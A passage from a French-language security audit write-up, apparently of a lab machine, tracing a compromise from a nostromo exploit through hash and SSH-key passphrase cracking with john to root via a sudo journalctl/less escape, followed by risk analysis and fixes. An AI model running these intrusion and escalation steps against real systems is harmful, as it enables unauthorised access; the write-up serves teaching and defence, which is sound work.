</code></pre><p>Résultats :</p><p><img src="https://i.imgur.com/22PhPsf.png" alt="Paramétrage de l'attaque et exploitation de la vulnérabilité par Metasploit"></p><p>Suite à l’exploitation de cette vulnérabilité, les auditeurs obtiennent un shell sur la machine distante avec l’identité de <code>www-data</code>.</p><h3 id="Compte-david---mauvaise-configuration-de-droits-et-mot-de-passe-faible-d’une-clé-privée-ssh"><a class="anchor hidden-xs" href="#Compte-david---mauvaise-configuration-de-droits-et-mot-de-passe-faible-d’une-clé-privée-ssh" title="Compte-david---mauvaise-configuration-de-droits-et-mot-de-passe-faible-d’une-clé-privée-ssh"><span class="octicon octicon-link"></span></a>Compte david - mauvaise configuration de droits et mot de passe faible d’une clé privée ssh</h3><p>Dans le but d’obtenir un meilleur confort visuel pour l’équipe d’audit et une meilleure restitution dans le rapport, il est d’usage d’importer un shell via python.</p><p>Commande :</p><pre><code class="bash hljs">python -c <span class="hljs-string">'import pty;pty.spawn("/bin/bash")'</span>
</code></pre><p>Résultat :</p><p><img src="https://i.imgur.com/qmLTNm0.png" alt="Import du shell via python"></p><p>Lorsqu’un attaquant possède un accès direct sur la machine cible, son objectif va être de gagner des privilèges en prenant le contrôle d’autres comptes.</p><p>La commande <code>sudo</code> permet de prendre le rôle d’un autre utilisateur durant l’exécution d’une commande.</p><p>L’équipe d’audit vérifie les droits qu’il possède avec l’utilisateur <code>www-data</code> sur la commande <code>sudo</code>.</p><p>Cependant, cette action est restreinte par une demande d’authentification.</p><p>Commande :</p><p><code>sudo -l</code></p><p>Résultat :</p><p><img src="https://i.imgur.com/xEYDhYi.png" alt="Vérification des droits de l'utilisateur www_data avec la commande sudo"></p><p>En inspectant la configuration du serveur web nostromo disponible sur la machine, les auditeurs obtiennent plusieurs informations importantes :</p><p><img src="https://i.imgur.com/ZPQiCw0.png" alt="Affichage du contenu du fichier de configuration du service nostromo"></p><p>La première information est le chemin menant au mot de passe utilisé par nostromo. En l’affichant, on obtient un condensat :</p><p>Commande :</p><p><code>cat .htpasswd</code></p><p>Résultat :</p><p><img src="https://i.imgur.com/nCFc1eh.png" alt="Affichage du contenu du fichier .htpasswd, qui correspond à un condensat"></p><p>Condensat :<br>
<code>david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/</code></p><p>L’équipe réalise alors une attaque par force brute sur le poste d’audit afin d’obtenir le mot de passe via l’outil <code>john</code> avec le dictionnaire de mots de passe <code>rockyou.txt</code> :</p><p>Commandes :</p><ul>
<li>
<p>Créé le fichier <code>hash2.crack</code> contenant le condensat.<br>
<code>echo -n '$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/'&gt;hash2.crack</code></p>
</li>
<li>
<p>Démarre l’attaque par force brute sur le condensat avec le dictionnaire de mot de passe rockyou.txt<br>
<code>john --wordlist=~/Documents/wordlist/rockyou.txt hash2.crack</code></p>
</li>
<li>
<p>Affiche le résultat de l’attaque par force brute (affichage de la dernière ligne).<br>
<code>tail -n1 ~/.john/john.pot</code></p>
</li>
</ul><p>Résultats :</p><p><img src="https://i.imgur.com/FDi5Z8W.png" alt="Cassage du condensat par force brute avec l'outil john the ripper"></p><p><img src="https://i.imgur.com/KUPAjuO.png" alt="Affichage du mot de passe provenant du condensat"></p><p>La réutilisation de mot de passe est une pratique courante, l’équipe d’audit vérifie cette donnée sur le service ssh :</p><p>Commande : <code>ssh david@10.10.10.165</code></p><p>Résultat :</p><p><img src="https://i.imgur.com/MAaWSqg.png" alt="Tentative de connexion via ssh en utilisant le mot de passe précédemment récupéré"></p><p>Et sur la machine auditée via la commande <code>su david</code> :</p><p><img src="https://i.imgur.com/Dde5mOd.png" alt="Tentative de connexion directement sur la machine auditée"></p><p>La machine ne réutilise donc pas les mêmes mots de passe pour plusieurs comptes, ce qui est une très bonne pratique et ralenti considérablement un attaquant.</p><p>La seconde information est le lieu de stockage des pages web du serveur nostromo :</p><pre><code class="bash hljs"><span class="hljs-comment"># HOMEDIRS [OPTIONAL]</span>

homedirs		/home
homedirs_public		public_www
</code></pre><p>En observant les dossiers dans <code>home</code>, on découvre que le dossier <code>david</code> a laissé les droits d’exécution sur son répertoire personnel.</p><p>Les droits d’exécution permettent le déplacement dans les dossiers et l’exécution des fichiers.</p><p>Commande : <code>ls -la</code></p><p>Résultat :</p><p><img src="https://i.imgur.com/W2gXB5w.png" alt="Affichage des droits liés au dossier de l'utilisateur david"></p><p>Les droits linux fonctionnent avec 3 catégories :</p><ul>
<li><strong>User</strong> : Droits de l’utilisateur possédant le fichier</li>
<li><strong>Group</strong> : Droits des utilisateurs faisant parti du groupe du fichier</li>
<li><strong>Other</strong> : Droits donnés au reste des utilisateurs de la machine.</li>
</ul><p><img src="https://i.imgur.com/PVuyuxY.png" alt="Schéma expliquant les différents droits d'un dossier/fichier sur linux"></p><p>Ceci signifie que l’utilisateur <code>www-data</code> peut se déplacer dans le dossier <code>/home/david</code> , mais ne pourra ni lire, ni écrire.</p><p>Grâce aux informations récupérées dans la configuration du serveur web nostromo, on peut en déduire que le dossier <code>public_www</code> doit être accessible depuis <code>/home/david</code>.</p><p>Commandes :</p><ul>
<li>
<p>Déplace le terminal dans le répertoire <code>david/public_www</code>.<br>
<code>cd david/public_www</code></p>
</li>
<li>
<p>Affiche tous les fichiers du répertoires ainsi que leurs droits.<br>
<code>ls -la</code></p>
</li>
<li>
<p>Déplace le terminal dans le répertoire <code>protected-file-area</code>.<br>
<code>cd protected-file-area</code></p>
</li>
</ul><p>Résultats :</p><p><img src="https://i.imgur.com/1tWJfuR.png" alt="Découverte d'une archive de sauvegarde contenant des clés ssh"></p><p>Parmis les nouveaux fichiers découverts, le fichier <code>backup-ssh-identity-files.tgz</code> semble le plus intéressant.<br>
Si celui-ci contient une clé privée, il serait possible d’attaquer la clé privée par force brute pour se connecter en <code>ssh</code>.</p><p>Afin d’exfiltrer le fichier de backup, l’auditeur l’encode en base64 et le copie dans le presse papier :</p><p>Commande : <code>base64 backup-ssh-identity-files.tgz</code></p><p>Résultat :</p><p><img src="https://i.imgur.com/wrU4rrh.png" alt="Encodage de l'archive en base64 afin de l'exfiltrer"></p><p>Ensuite, il le colle à l’intérieur d’un fichier quelconque (ici <code>base64tar.txt</code>) sur sa machine via un éditeur de texte de son choix (ici <code>vim</code>).</p><p>En affichant le contenu du fichier puis en le passant dans la commande <code>base64</code> avec l’option <code>-d</code> pour décoder, on reconstruit l’archive de base.</p><p>Le contenu de l’archive est alors extrait, révélant un dossier contenant une clé privée ssh.</p><p>Commandes :</p><ul>
<li>
<p>Ouvre le fichier <code>base64tar.txt</code> dans l’éditeur de texte console <code>vim</code>.<br>
<code>vim base64tar.txt</code></p>
</li>
<li>
<p>Affiche le base64 pour le décoder et reconstruire ainsi l’archive.<br>
<code>cat base64tar.txt | base64 -d &gt; backup-ssh-identity-files.tgz</code></p>
</li>
<li>
<p>Extrait le contenu de l’archive.<br>
<code>tar -xvf backup-ssh-identity-files.tgz</code></p>
</li>
<li>
<p>Déplace le terminal dans l’archive récemment extraite.<br>
<code>cd home/david/.ssh</code></p>
</li>
<li>
<p>Télécharge l’outil permettant de transformer une clé privée ssh en un condensat attaquable par l’outil john.<br>
<code>wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/ssh2john.py</code></p>
</li>
<li>
<p>Transforme une clé privée ssh en un condensat attaquable par l’outil john.<br>
<code>python ssh2john.py id_rsa &gt; ssh_to_crack</code></p>
</li>
</ul><p>Résultats :</p><p><img src="https://i.imgur.com/337PgHc.png" alt="Reconstruction de l'archive, extraction de son contenu et transformation de la clé privée ssh en un condensat utilisable par l'outil john the ripper"></p><p>L’auditeur procède alors à une attaque par force brute avec l’outil <code>john</code> via la liste de mots de passe <code>rockyou.txt</code>, permettant ainsi de récupérer la passphrase de la clé privée (ici <code>hunter</code>).</p><p>Il est nécessaire de changer les droits de la clé privée afin qu’elle puisse être employée pour la connexion <code>ssh</code>.<br>
Ces droits donnent au propriétaire du fichier la lecture et l’écriture.</p><p>Finalement, l’auditeur se connecte en <code>ssh</code> sur la machine distante avec l’utilisateur <code>david</code> et récupère le condensat uniquement accessible par celui-ci.</p><p>Commandes :</p><ul>
<li>
<p>Démarre une attaque par force brute sur le condensat en utilisant la liste de mot de passe <code>rockyou.txt</code>.<br>
<code>john --wordlist=/home/maltemo/Documents/wordlist/rockyou.txt ssh_to_crack</code></p>
</li>
<li>
<p>Change les droits de la clé privée pour nous donner les droits d’écriture et de lecture.<br>
<code>chmod 600 id_rsa</code></p>
</li>
<li>
<p>Démarre une connexion ssh vers la machine cible en tant que david en utilisant sa clé privée.<br>
<code>ssh -i id_rsa david@10.10.10.165</code></p>
</li>
<li>
<p>Affiche l’utilisateur que l’on utilise actuellement sur la machine.<br>
<code>id</code></p>
</li>
<li>
<p>Affiche le contenu du fichier <code>user.txt</code>.<br>
<code>cat user.txt</code></p>
</li>
</ul><p>Résultats :</p><p><img src="https://i.imgur.com/x9Ae2rk.png" alt="Cassage du condensat, modification des droits sur la clé privée et connexion avec celle-ci en tant que david"></p><h2 id="Phase-d’exploitation-Root"><a class="anchor hidden-xs" href="#Phase-d’exploitation-Root" title="Phase-d’exploitation-Root"><span class="octicon octicon-link"></span></a>Phase d’exploitation Root</h2><h3 id="Compte-root---Elévation-de-privilège-via-sudo-sans-mot-de-passe"><a class="anchor hidden-xs" href="#Compte-root---Elévation-de-privilège-via-sudo-sans-mot-de-passe" title="Compte-root---Elévation-de-privilège-via-sudo-sans-mot-de-passe"><span class="octicon octicon-link"></span></a>Compte root - Elévation de privilège via sudo sans mot de passe</h3><p>L’équipe d’audit vérifie les droits qu’il possède avec l’utilisateur <code>david</code> sur la commande <code>sudo</code>.</p><p>Cependant, cette action est restreinte par une demande d’authentification.<br>
L’auditeur possède le mot de passe de la clé privée ssh, mais pas celui du compte de david.</p><p>Commande : <code>sudo -l</code></p><p>Résultat :</p><p><img src="https://i.imgur.com/N1k7872.png" alt="Vérification des droits de l’utilisateur david avec la commande sudo"></p><p>Les auditeurs vont ensuite chercher des fichiers possédant un SUID bit.</p><p>Ce bit permet de prendre momentanément les droits de l’utilisateur possédant le fichier.</p><p>Aucun de ces exécutables ne sont faillibles face à une attaque visant à une montée en privilège.</p><p>Commande : <code>find / -perm /4000 2&gt;/dev/null</code></p><p>Résultat :</p><p><img src="https://i.imgur.com/jkejKgr.png" alt="Liste des exécutables avec les droits SUID"></p><p>L’équipe d’audit continue sa recherche dans le dossier principal de l’utilisateur david.</p><p>Un script nommé <code>server-stats.sh</code> semble suspect, les auditeurs affichent son contenu.</p><p>Commandes :</p><ul>
<li>
<p>Affiche le contenu du dossier courant.<br>
<code>ls</code></p>
</li>
<li>
<p>Déplace le terminal dans le répertoire bin.<br>
<code>cd bin/</code></p>
</li>
<li>
<p>Affiche le contenu du fichier <code>server-stats.sh</code>.<br>
<code>cat server-stats.sh</code></p>
</li>
</ul><p>Résultat :</p><p><img src="https://i.imgur.com/L0J8lKm.png" alt="Affichage du contenu d'un script potentiellement exploitable"></p><p>Dans se script, chaque commande est appelée via un chemin absolue, ce qui empêche toute attaque par changement de la variable <code>PATH</code>.</p><p>La commande <code>/usr/bin/sudo</code> est appelée dans le script, il est important de vérifier si le script demande le mot de passe de l’utilisateur david.</p><p>Commande : <code>./server-stats.sh</code></p><p>Résultat :</p><p><img src="https://i.imgur.com/YoRYjIl.png" alt="Le script ne demande pas d'authentification lors de l'utilisation de journalctl avec sudo"></p><p>La figure 24 montre que le système d’authentification PAM, à travers le script, n’a demandé aucune authentification lors de l’appel de la commande <code>journalctl</code> avec <code>sudo</code>.</p><p>En cherchant sur le site de <a href="https://gtfobins.github.io/gtfobins/journalctl/" target="_blank" rel="noopener">GTFObins</a>, il est indiqué qu’une escalade de privilège est possible via la commande journalctl (voir la figure 25 ci-dessous).</p><p><img src="https://i.imgur.com/Niv4oSk.png" alt="Exploitation de la commande journalctl avec les droits sudo"></p><p>L’objectif est d’obtenir le mode intéractif de la commande less via la commande journalctl, permettant ainsi d’obtenir un bash en tapant la commande suivante : <code>!/bin/sh</code></p><p>Dans un premier temps, l’équipe d’audit réalise une copie du script, afin de modifier le script sans altérer son état de base.</p><p>Commandes :</p><ul>
<li>
<p>Copie le script shell.<br>
<code>cp server-stats.sh exploitable.sh</code></p>
</li>
<li>
<p>Ouvre le script dans un éditeur de texte console appelé <code>vi</code>.<br>
<code>vi exploitable.sh</code></p>
</li>
</ul><p>Résultat :</p><p><img src="https://i.imgur.com/ztIRrAm.png" alt="Copie du script et modification via l'éditeur vi pour le rendre exploitable"></p><p>La commande <code>|/usr/bin/cat</code> est supprimée afin de pouvoir accéder à l’interface intéractive de less.</p><p>L’équipe d’audit réalise un première tentative d’exploitation.</p><p><img src="https://i.imgur.com/XKl3DHi.png" alt="Tentative d'exploitation du script modifié"></p><p>Celle-ci échoue, la commande ne lance pas <code>less</code> en mode intéractif.<br>
Afin de mieux comprendre pourquoi l’exploit a échoué, il est nécessaire de comprendre le fonctionnement de <code>journalctl</code> et de <code>less</code>.</p><p>Journalctl permet de lire les journaux (logs) d’un service.<br>
Dans ce script, la commande lis les journaux du service nostromo (<code>-unostromo.service</code>) et affiche les 5 dernières lignes (<code>-n5</code>).</p><p>Commande : <code>/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service</code></p><p>Ainsi, en affichant uniquement 5 ligne du journal, less ne passera pas en mode interactif.<br>
Pour passer en mode intéractif, il faut que less ne puisse pas faire tenir l’ensemble du message à lire dans le terminal.</p><p>Ainsi, en réduisant la taille du terminal à une ou deux lignes visibles, l’auditeur pourra passer en mode intéractif et réaliser la montée en privilèges.</p><p>Résultats :</p><p><img src="https://i.imgur.com/9V3kbsS.png" alt="Seconde tentative d'exploitation du script modifié"></p><p><img src="https://i.imgur.com/7SH6kEW.png" alt="Utilisation de l'escalade de privilège précédemment abordé dans la figure 25"></p><p>L’équipe d’audit obtient alors un accès administrateur sur la machine et possède tous les droits.</p><p><img src="https://i.imgur.com/Uy3ypGW.png" alt="Passage administrateur et affichage du condensat uniquement accessible par l'utilisateur root"></p><h2 id="Analyse-de-risque"><a class="anchor hidden-xs" href="#Analyse-de-risque" title="Analyse-de-risque"><span class="octicon octicon-link"></span></a>Analyse de risque</h2><p>Nous allons lister les vulnérabilités afin d’en évaluer le risque :</p><h3 id="Nostromo-CVE-2019-16278"><a class="anchor hidden-xs" href="#Nostromo-CVE-2019-16278" title="Nostromo-CVE-2019-16278"><span class="octicon octicon-link"></span></a>Nostromo CVE 2019-16278</h3><p>Cette vulnérabilité, afin d’être exploitée neccessite les éléments suivants :</p><ol>
<li>Un accès par réseau à la machine cible.</li>
<li>Un service nostromo avec une version antérieure ou égale à la version 1.9.6 hébergé sur la machine cible.</li>
<li>Un attaquant ayant une maîtrise légère de l’outil Metasploit</li>
</ol><p><strong>Probabilité :</strong> La probabilité que cette vulnérabilité soit exploitée activement est très élevée. En effet, les vulnérabilités ayant un PoC (Proof of Concept) publié ainsi qu’un module disponible sur metasploit sont souvent utilisées par des groupes d’attaquants pour gagner un point d’entrée sur un serveur et par extension sur un système d’information.</p><p><strong>Impact :</strong> L’exploitation de cette vulnérabilité permet de se connecter avec un utilisateur légitime sur la machine (<code>www-data</code>) permettant par la suite une éventuelle escalade de privilège. Ce point d’entrée fournit une possiblité d’exfiltration de données non-négligeable.</p><p><img src="https://i.imgur.com/Ej5PXu2.png" alt=""></p><h3 id="Problèmes-de-configuration-de-droits-de-fichiers"><a class="anchor hidden-xs" href="#Problèmes-de-configuration-de-droits-de-fichiers" title="Problèmes-de-configuration-de-droits-de-fichiers"><span class="octicon octicon-link"></span></a>Problèmes de configuration de droits de fichiers</h3><p>Cette vulnérabilité, afin d’être exploitée neccessite les éléments suivants :</p><ol>
<li>Un accès distant sur la machine cible via un utilisateur quelconque.</li>
<li>Un dossier contenant des informations utiles pour l’escalade de privilège.</li>
<li>Un problème de configuration de droit (qu’il soit en lecture, écriture ou exécution)</li>
<li>Des informations supplémentaires pouvant mener à la découverte d’informations sensibles (fichier de configuration nostromo dans notre cas)</li>
</ol><p><strong>Probabilité :</strong> Un attaquant maitrisant un minimum le système d’exploitation linux est capable d’exploiter cette vulnérabilité.<br>
Cependant, il faut tout de même un accès sur la machine distante avec un compte.</p><p><strong>Impact :</strong> L’exploitation de cette vulnérabilité permet d’accéder à des données normalement protégées, pouvant mener à une escalade de privilège.</p><p><img src="https://i.imgur.com/FkIMB09.png" alt=""></p><h3 id="Problèmes-de-configuration-de-sudo"><a class="anchor hidden-xs" href="#Problèmes-de-configuration-de-sudo" title="Problèmes-de-configuration-de-sudo"><span class="octicon octicon-link"></span></a>Problèmes de configuration de sudo</h3><p>Cette vulnérabilité, afin d’être exploitée neccessite les éléments suivants :</p><ol>
<li>Un accès avec distant avec l’utilisateur pour qui les droits sudo ont été modifiés.</li>
<li>Une configuration donnant les droits sudo sans demander de mot de passe pour une commande quelconque.</li>
</ol><p><strong>Probabilité :</strong> Toutes les informations liées à ces vulnérabilités sont disponibles en libre service sur le site GTFObins. Néanmoins, cette faille n’est exploitable qu’en ayant le contrôle d’un utilisateur ayant des droits privilégiés sur la commande <code>sudo</code>.</p><p><strong>Impact :</strong> L’exploitation de cette vulnérabilité permet d’escalader les privilèges et de gagner le contrôle du compte root et donc de la machine complète.</p><p><img src="https://i.imgur.com/5KO6nf9.png" alt=""></p><h2 id="Recommandations"><a class="anchor hidden-xs" href="#Recommandations" title="Recommandations"><span class="octicon octicon-link"></span></a>Recommandations</h2><p>L’équipe d’audit apporte maintenant des solutions afin de régler les failles qui ont été exploitées dans lors de l’audit.</p><h3 id="Nostromo"><a class="anchor hidden-xs" href="#Nostromo" title="Nostromo"><span class="octicon octicon-link"></span></a>Nostromo</h3><p>Afin de régler la faille de nostromo, il faut mettre à jour ce service.<br>
Si le serveur a été installé via le gestionnaire de packet apt, voici la commande à réaliser :<br>
<code>sudo apt update; sudo apt upgrade</code></p><p>Il est recommandé de mettre à jour les services sur l’ensemble du parc informatique environ une fois par semaine, particulièrement sur les serveurs exposés directement sur internet.</p><h3 id="Droits-de-fichier-et-Sauvegardes"><a class="anchor hidden-xs" href="#Droits-de-fichier-et-Sauvegardes" title="Droits-de-fichier-et-Sauvegardes"><span class="octicon octicon-link"></span></a>Droits de fichier et Sauvegardes</h3><p>Le problème de droit sur le répertoire david se règle via la commande suivante : <code>chmod 750 /home/david</code></p><p>Via cette commande, on donne les droits suivants sur le fichier :</p><ul>
<li>Droits Utilisateur (utilisateur <code>david</code>) : <span class="mathjax"><span class="MathJax_Preview" style="color: inherit;"></span><span id="MathJax-Element-9-Frame" class="mjx-chtml MathJax_CHTML" tabindex="0" style="font-size: 127%; position: relative;" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><mo stretchy=&quot;false&quot;>(</mo><mn>7</mn><msub><mo stretchy=&quot;false&quot;>)</mo><mrow class=&quot;MJX-TeXAtom-ORD&quot;><mn>10</mn></mrow></msub><mo stretchy=&quot;false&quot;>&amp;#x2192;</mo><mo stretchy=&quot;false&quot;>(</mo><mn>111</mn><msub><mo stretchy=&quot;false&quot;>)</mo><mrow class=&quot;MJX-TeXAtom-ORD&quot;><mn>2</mn></mrow></msub></math>" role="presentation"><span id="MJXc-Node-117" class="mjx-math" aria-hidden="true"><span id="MJXc-Node-118" class="mjx-mrow"><span id="MJXc-Node-119" class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.445em; padding-bottom: 0.593em;">(</span></span><span id="MJXc-Node-120" class="mjx-mn"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.396em; padding-bottom: 0.347em;">7</span></span><span id="MJXc-Node-121" class="mjx-msubsup"><span class="mjx-base"><span id="MJXc-Node-122" class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.445em; padding-bottom: 0.593em;">)</span></span></span><span class="mjx-sub" style="font-size: 70.7%; vertical-align: -0.212em; padding-right: 0.071em;"><span id="MJXc-Node-123" class="mjx-texatom" style=""><span id="MJXc-Node-124" class="mjx-mrow"><span id="MJXc-Node-125" class="mjx-mn"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.396em; padding-bottom: 0.347em;">10</span></span></span></span></span></span><span id="MJXc-Node-126" class="mjx-mo MJXc-space3"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.249em; padding-bottom: 0.347em;">→</span></span><span id="MJXc-Node-127" class="mjx-mo MJXc-space3"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.445em; padding-bottom: 0.593em;">(</span></span><span id="MJXc-Node-128" class="mjx-mn"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.396em; padding-bottom: 0.347em;">111</span></span><span id="MJXc-Node-129" class="mjx-msubsup"><span class="mjx-base"><span id="MJXc-Node-130" class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.445em; padding-bottom: 0.593em;">)</span></span></span><span class="mjx-sub" style="font-size: 70.7%; vertical-align: -0.212em; padding-right: 0.071em;"><span id="MJXc-Node-131" class="mjx-texatom" style=""><span id="MJXc-Node-132" class="mjx-mrow"><span id="MJXc-Node-133" class="mjx-mn"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.396em; padding-bottom: 0.347em;">2</span></span></span></span></span></span></span></span><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><mo stretchy="false">(</mo><mn>7</mn><msub><mo stretchy="false">)</mo><mrow class="MJX-TeXAtom-ORD"><mn>10</mn></mrow></msub><mo stretchy="false">→</mo><mo stretchy="false">(</mo><mn>111</mn><msub><mo stretchy="false">)</mo><mrow class="MJX-TeXAtom-ORD"><mn>2</mn></mrow></msub></math></span></span><script type="math/tex" id="MathJax-Element-9">(7)_{10} \rightarrow (111)_{2}</script></span>. Ceci indique que david possède les droits en lecture (bit de poid fort), les droits en écriture et les droits d’exécution.</li>
<li>Droits Groupe (groupe <code>david</code>) : <span class="mathjax"><span class="MathJax_Preview" style="color: inherit;"></span><span id="MathJax-Element-10-Frame" class="mjx-chtml MathJax_CHTML" tabindex="0" style="font-size: 127%; position: relative;" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><mo stretchy=&quot;false&quot;>(</mo><mn>5</mn><msub><mo stretchy=&quot;false&quot;>)</mo><mrow class=&quot;MJX-TeXAtom-ORD&quot;><mn>10</mn></mrow></msub><mo stretchy=&quot;false&quot;>&amp;#x2192;</mo><mo stretchy=&quot;false&quot;>(</mo><mn>101</mn><msub><mo stretchy=&quot;false&quot;>)</mo><mrow class=&quot;MJX-TeXAtom-ORD&quot;><mn>2</mn></mrow></msub></math>" role="presentation"><span id="MJXc-Node-134" class="mjx-math" aria-hidden="true"><span id="MJXc-Node-135" class="mjx-mrow"><span id="MJXc-Node-136" class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.445em; padding-bottom: 0.593em;">(</span></span><span id="MJXc-Node-137" class="mjx-mn"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.396em; padding-bottom: 0.347em;">5</span></span><span id="MJXc-Node-138" class="mjx-msubsup"><span class="mjx-base"><span id="MJXc-Node-139" class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.445em; padding-bottom: 0.593em;">)</span></span></span><span class="mjx-sub" style="font-size: 70.7%; vertical-align: -0.212em; padding-right: 0.071em;"><span id="MJXc-Node-140" class="mjx-texatom" style=""><span id="MJXc-Node-141" class="mjx-mrow"><span id="MJXc-Node-142" class="mjx-mn"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.396em; padding-bottom: 0.347em;">10</span></span></span></span></span></span><span id="MJXc-Node-143" class="mjx-mo MJXc-space3"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.249em; padding-bottom: 0.347em;">→</span></span><span id="MJXc-Node-144" class="mjx-mo MJXc-space3"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.445em; padding-bottom: 0.593em;">(</span></span><span id="MJXc-Node-145" class="mjx-mn"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.396em; padding-bottom: 0.347em;">101</span></span><span id="MJXc-Node-146" class="mjx-msubsup"><span class="mjx-base"><span id="MJXc-Node-147" class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.445em; padding-bottom: 0.593em;">)</span></span></span><span class="mjx-sub" style="font-size: 70.7%; vertical-align: -0.212em; padding-right: 0.071em;"><span id="MJXc-Node-148" class="mjx-texatom" style=""><span id="MJXc-Node-149" class="mjx-mrow"><span id="MJXc-Node-150" class="mjx-mn"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.396em; padding-bottom: 0.347em;">2</span></span></span></span></span></span></span></span><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><mo stretchy="false">(</mo><mn>5</mn><msub><mo stretchy="false">)</mo><mrow class="MJX-TeXAtom-ORD"><mn>10</mn></mrow></msub><mo stretchy="false">→</mo><mo stretchy="false">(</mo><mn>101</mn><msub><mo stretchy="false">)</mo><mrow class="MJX-TeXAtom-ORD"><mn>2</mn></mrow></msub></math></span></span><script type="math/tex" id="MathJax-Element-10">(5)_{10} \rightarrow (101)_{2}</script></span>. Ceci indique que les utilisateurs du groupe david ont les droits de lecture et d’exécution sur le fichier.</li>
<li>Droits pour le reste du monde (le reste des utilisateurs de la machine sauf root): <span class="mathjax"><span class="MathJax_Preview" style="color: inherit;"></span><span id="MathJax-Element-11-Frame" class="mjx-chtml MathJax_CHTML" tabindex="0" style="font-size: 127%; position: relative;" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><mo stretchy=&quot;false&quot;>(</mo><mn>0</mn><msub><mo stretchy=&quot;false&quot;>)</mo><mrow class=&quot;MJX-TeXAtom-ORD&quot;><mn>10</mn></mrow></msub><mo stretchy=&quot;false&quot;>&amp;#x2192;</mo><mo stretchy=&quot;false&quot;>(</mo><mn>000</mn><msub><mo stretchy=&quot;false&quot;>)</mo><mrow class=&quot;MJX-TeXAtom-ORD&quot;><mn>2</mn></mrow></msub></math>" role="presentation"><span id="MJXc-Node-151" class="mjx-math" aria-hidden="true"><span id="MJXc-Node-152" class="mjx-mrow"><span id="MJXc-Node-153" class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.445em; padding-bottom: 0.593em;">(</span></span><span id="MJXc-Node-154" class="mjx-mn"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.396em; padding-bottom: 0.347em;">0</span></span><span id="MJXc-Node-155" class="mjx-msubsup"><span class="mjx-base"><span id="MJXc-Node-156" class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.445em; padding-bottom: 0.593em;">)</span></span></span><span class="mjx-sub" style="font-size: 70.7%; vertical-align: -0.212em; padding-right: 0.071em;"><span id="MJXc-Node-157" class="mjx-texatom" style=""><span id="MJXc-Node-158" class="mjx-mrow"><span id="MJXc-Node-159" class="mjx-mn"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.396em; padding-bottom: 0.347em;">10</span></span></span></span></span></span><span id="MJXc-Node-160" class="mjx-mo MJXc-space3"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.249em; padding-bottom: 0.347em;">→</span></span><span id="MJXc-Node-161" class="mjx-mo MJXc-space3"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.445em; padding-bottom: 0.593em;">(</span></span><span id="MJXc-Node-162" class="mjx-mn"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.396em; padding-bottom: 0.347em;">000</span></span><span id="MJXc-Node-163" class="mjx-msubsup"><span class="mjx-base"><span id="MJXc-Node-164" class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.445em; padding-bottom: 0.593em;">)</span></span></span><span class="mjx-sub" style="font-size: 70.7%; vertical-align: -0.212em; padding-right: 0.071em;"><span id="MJXc-Node-165" class="mjx-texatom" style=""><span id="MJXc-Node-166" class="mjx-mrow"><span id="MJXc-Node-167" class="mjx-mn"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.396em; padding-bottom: 0.347em;">2</span></span></span></span></span></span></span></span><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><mo stretchy="false">(</mo><mn>0</mn><msub><mo stretchy="false">)</mo><mrow class="MJX-TeXAtom-ORD"><mn>10</mn></mrow></msub><mo stretchy="false">→</mo><mo stretchy="false">(</mo><mn>000</mn><msub><mo stretchy="false">)</mo><mrow class="MJX-TeXAtom-ORD"><mn>2</mn></mrow></msub></math></span></span><script type="math/tex" id="MathJax-Element-11">(0)_{10} \rightarrow (000)_{2}</script></span>. Ceci indique que le reste des utilisateurs n’ont aucun droits sur le dossier et ne peuvent donc pas intéragir avec.</li>
</ul><blockquote>
